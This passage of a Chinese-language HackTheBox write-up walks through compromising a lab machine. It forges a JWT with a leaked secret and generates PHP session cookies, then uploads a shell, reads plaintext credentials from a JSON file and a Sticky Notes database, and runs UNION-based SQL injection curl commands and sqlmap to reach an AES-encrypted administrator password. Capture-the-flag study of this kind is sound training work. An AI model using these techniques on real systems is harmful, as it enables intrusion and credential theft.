class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$max</span> = strlen(<span class="variable">$username</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$seed</span> = rand(<span class="number">0</span>, <span class="variable">$max</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$seed</span>].<span class="string">&quot;(!528.\/9890&quot;</span>;</span><br><span class="line">    <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session_cookie</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/includes/fileController.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jwt</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span> = JWT::decode(<span class="variable">$jwt</span>, <span class="variable">$secret_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;HS256&#x27;</span>));   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$admins</span> = <span class="keyword">array</span>(<span class="string">&quot;paul&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span> = validate()-&gt;data-&gt;username;</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$user</span>, <span class="variable">$admins</span>) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">        error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">        <span class="variable">$uploads_dir</span> = <span class="string">&#x27;../uploads&#x27;</span>;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="string">&quot;<span class="subst">$uploads_dir</span>/<span class="subst">$name</span>&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Success. Have a great weekend!&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Missing file or title :(&quot;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/php/files.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$LOGGED_IN</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$LOGGED_IN</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;../db/db.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../auth/login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且files.php存在一个上传功能<br />
以理一下攻击链</p>
<ul>
<li>fileController.php上传文件</li>
<li>要求得到<code>paul</code>的身份</li>
<li>生成<code>PHPSESSID</code>和<code>JWT</code></li>
</ul>
<p>对于<code>JWT</code></p>
<p>我们已经得到了签名密钥</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token_dict = &#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;paul&quot;</span>&#125;&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>, <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, <span class="string">&quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=headers).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI</span><br></pre></td></tr></table></figure>
<p>对于<code>PHPSESSID</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;paul&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$num</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$a</span>].<span class="string">&quot;(!528./9890&quot;</span>;</span><br><span class="line">        <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$session_cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>
<p>最后得到的Cookie为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>
<p>上传ZIP时修改文件名和文件内容即可GetShell</p>
<h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData\juliette.json</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;pizza&quot;</span> : <span class="string">&quot;margherita&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;size&quot;</span> : <span class="string">&quot;large&quot;</span>,	</span><br><span class="line">	<span class="attr">&quot;drink&quot;</span> : <span class="string">&quot;water&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;card&quot;</span> : <span class="string">&quot;VISA&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;PIN&quot;</span> : <span class="string">&quot;9890&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;alternate&quot;</span> : &#123;</span><br><span class="line">		<span class="attr">&quot;username&quot;</span> : <span class="string">&quot;juliette&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;password&quot;</span> : <span class="string">&quot;jUli901./())!&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用凭证<code>juliette:jUli901./())!</code>登入ssh服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\user.txt</span><br><span class="line">c5d9d568c5fc21e0dc0c5819d16aad9f</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\todo.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html&#123;</span><br><span class="line">background:black;</span><br><span class="line">color:orange;</span><br><span class="line">&#125;</span><br><span class="line">table,th,td&#123;</span><br><span class="line">border:1px solid orange;</span><br><span class="line">padding:1em;</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;Task&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Status&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Reason&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Configure firewall <span class="keyword">for</span> port 22 and 445&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;   </span><br><span class="line">            &lt;td&gt;In progress&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;It stores passwords <span class="keyword">in</span> plain text&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Add new features to password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>寻找密码存储文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\juliette\Documents</span><br><span class="line"></span><br><span class="line">11/29/2020  04:10 AM             4,096 plum.sqlite</span><br><span class="line">01/15/2021  05:10 PM            32,768 plum.sqlite-shm</span><br><span class="line">01/15/2021  05:10 PM           329,632 plum.sqlite-wal</span><br></pre></td></tr></table></figure>
<p>复制到本地使用sqlite访问</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 plum.sqlite </span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">Media           Stroke          SyncState       User          </span><br><span class="line">Note            StrokeMetadata  UpgradedNote  </span><br><span class="line">sqlite&gt; select * from Note;</span><br><span class="line">\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!</span><br><span class="line">\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g</span><br><span class="line">\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122</span><br></pre></td></tr></table></figure>
<p>得到凭证<code>development:fN3)sN5Ee@g</code></p>
<p>登入ssh服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Development</span><br><span class="line"></span><br><span class="line">11/29/2020  04:11 AM            18,312 Krypter_Linux</span><br></pre></td></tr></table></figure>
<p>IDA反编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v6, argv, envp);</span><br><span class="line">  v8 = curl_easy_init();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Krypter V1.2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New project by Juliette.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New features added weekly!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;What to expect next update:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Windows version with GUI support\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Get password from cloud and AUTOMATICALLY decrypt!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 += argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == <span class="number">1601</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Requesting decryption key from cloud...\nAccount: Administrator&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10002LL</span>, (__int64)<span class="string">&quot;http://passmanager.htb:1234/index.php&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10015LL</span>, (__int64)<span class="string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">20011LL</span>, (__int64)WriteCallback);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10001LL</span>, (__int64)v6);</span><br><span class="line">        v7 = curl_easy_perform(v8);</span><br><span class="line">        curl_easy_cleanup(v8);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Server response:\n\n&quot;</span>);</span><br><span class="line">        v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v6);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect master key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No key supplied.\nUSAGE:\n\nKrypter &lt;key&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br><span class="line"></span><br><span class="line">  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure>
<p>用程序中的URL访问</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br><span class="line"></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到AES_KEY</p>
<p>尝试SQL注入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>手工注入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure>
<p>得到<code>H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=</code></p>
<ul>
<li>SSH端口映射跑SQLMap</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure>
<p>sqlmap的步骤就懒得写了</p>
<p>解密</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">iv = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;</span>)</span><br><span class="line">_aes = AES.new(<span class="string">b&quot;k19D193j.&lt;19391(&quot;</span>, AES.MODE_CBC, iv)</span><br><span class="line">plain = _aes.decrypt(cipher)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure>
<p>得到凭证<code>administrator:p@ssw0rd!@#$9890./</code></p>
<p>登入SSH服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br><span class="line">c04f72045d76a74c63a602f199a79ecd</span><br></pre></td></tr></table></figure>
<p>挺综合的一台机器</p>
<hr />
<h1 id="hackthebox_proper"><a class="markdownIt-Anchor" href="#hackthebox_proper"></a> HackTheBox_Proper</h1>
<h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2>
